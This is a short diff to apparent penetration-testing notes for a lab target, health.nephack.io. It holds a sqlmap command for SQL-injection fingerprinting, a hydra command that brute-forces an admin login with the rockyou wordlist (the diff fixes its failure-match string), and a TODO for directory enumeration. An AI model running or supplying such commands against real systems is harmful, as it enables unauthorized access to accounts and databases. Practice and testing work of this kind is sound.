@@ -149,12 +149,12 @@ sqlmap -r request.txt -p age -D heart --fingerprint
 
 Bruteforcing /admin/index.php login page
 
-hydra -l admin -P /media/nikesh/HDD/Security/wordlist/rockyou.txt health.nephack.io http-post-form "/system-management/admin/index.php:username=^USER^&password=^PASS^:<script>window.location.href='index.php'</script>" -V -f
+hydra -l admin -P /media/nikesh/HDD/Security/wordlist/rockyou.txt health.nephack.io http-post-form "/system-management/admin/index.php:username=^USER^&password=^PASS^:sign in now" -V -f
 
 Issue with bruteforce (false positive)
 Fix failed message to <script>window.location.href='index.php'</script>
 
 ## TODO
 
-dirsearch /db/, /system-management/
+dirsearch /db/, /system-management/admin
 count no. of entries for table result
